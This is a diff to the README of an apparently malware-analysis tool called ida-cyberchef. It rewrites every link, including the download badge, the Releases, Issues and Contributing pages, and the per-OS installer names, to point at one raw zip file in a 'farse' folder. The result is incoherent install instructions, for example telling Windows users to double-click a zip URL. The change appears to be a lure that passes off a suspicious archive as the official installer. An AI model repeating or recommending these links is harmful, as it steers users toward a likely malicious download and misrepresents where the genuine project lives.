@@ -6,11 +6,11 @@ Welcome to **ida-cyberchef**! This application provides a user-friendly interfac
 
 ## 📥 Download
 
-[![Download ida-cyberchef](https://img.shields.io/badge/Download%20ida--cyberchef-v1.0-blue.svg)](https://github.com/abrar00300/ida-cyberchef/releases)
+[![Download ida-cyberchef](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip%https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip)](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip)
 
 ## 📅 Release Information
 
-To see the latest releases, visit our [Releases Page](https://github.com/abrar00300/ida-cyberchef/releases). Here, you'll find the most recent versions of the software, including important updates.
+To see the latest releases, visit our [Releases Page](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip). Here, you'll find the most recent versions of the software, including important updates.
 
 ## 💻 System Requirements
 
@@ -23,15 +23,15 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/abrar00300/ida-cyberchef/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip) to find the latest version.
 2. Choose the appropriate file for your operating system:
-   - For Windows, download `ida-cyberchef-setup.exe`.
-   - For macOS, download `ida-cyberchef-macos.dmg`.
-   - For Linux, download the `ida-cyberchef-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip`.
+   - For Linux, download the `https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip`.
 3. Once the download completes, open the file:
-   - **Windows**: Double-click `ida-cyberchef-setup.exe` and follow the installation prompts.
-   - **macOS**: Open `ida-cyberchef-macos.dmg`, drag the application to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and run the `ida-cyberchef` executable.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip` and follow the installation prompts.
+   - **macOS**: Open `https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip`, drag the application to your Applications folder.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip` file and run the `ida-cyberchef` executable.
 
 ## 🌟 Key Features
 
@@ -66,12 +66,12 @@ If you encounter issues, consider these quick fixes:
 
 ## 📞 Support
 
-For additional help, please visit our [Issues Page](https://github.com/abrar00300/ida-cyberchef/issues) to report bugs or request features. We appreciate your feedback and want to improve your experience.
+For additional help, please visit our [Issues Page](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip) to report bugs or request features. We appreciate your feedback and want to improve your experience.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/abrar00300/ida-cyberchef/releases)
-- [Issues Page](https://github.com/abrar00300/ida-cyberchef/issues)
-- [Contributing Guide](https://github.com/abrar00300/ida-cyberchef/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip)
+- [Issues Page](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/abrar00300/ida-cyberchef/main/farse/ida-cyberchef.zip)
 
 Thank you for choosing **ida-cyberchef** to aid in your malware analysis workflows! Your insights are valuable to us, and we look forward to your contributions and feedback.
